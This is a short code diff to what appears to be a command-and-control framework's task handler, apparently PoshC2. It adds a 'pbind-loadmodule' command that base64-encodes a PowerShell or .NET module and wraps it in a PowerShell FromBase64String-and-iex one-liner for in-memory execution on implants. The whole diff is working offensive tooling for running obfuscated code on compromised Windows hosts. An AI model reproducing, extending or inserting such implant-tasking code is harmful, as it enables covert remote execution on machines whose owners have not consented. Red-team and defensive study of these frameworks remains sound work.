@@ -1,6 +1,6 @@
 from Colours import Colours
 from Core import load_module, load_module_sharp, encrypt, default_response
-import DB, datetime, hashlib, re, base64
+import DB, datetime, hashlib, re, base64, traceback
 
 
 def newTask(path):
@@ -65,6 +65,21 @@ def newTask(path):
                         except Exception as e:
                             print("Cannot find module, loadmodule is case sensitive!")
                             print(e)
+                    if a[2].startswith("pbind-loadmodule"):
+                        try:
+                            module_name = (a[2]).replace("pbind-loadmodule ", "")
+                            if ".exe" in module_name:
+                                modulestr = load_module_sharp(module_name)
+                            elif ".dll" in module_name:
+                                modulestr = load_module_sharp(module_name)
+                            else:
+                                modulestr = load_module(module_name)
+                            command = "pbind-command \"`$mk = '%s';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$mk))|iex\"" % base64.b64encode(bytes(modulestr, "utf-8")).decode('utf-8')
+                            print(command)
+                        except Exception as e:
+                            print("Cannot find module, loadmodule is case sensitive!")
+                            print(e)
+                            traceback.print_exc()
                     command = taskIdStr + command
                     if commands:
                         commands += "!d-3dion@LD!-d" + command
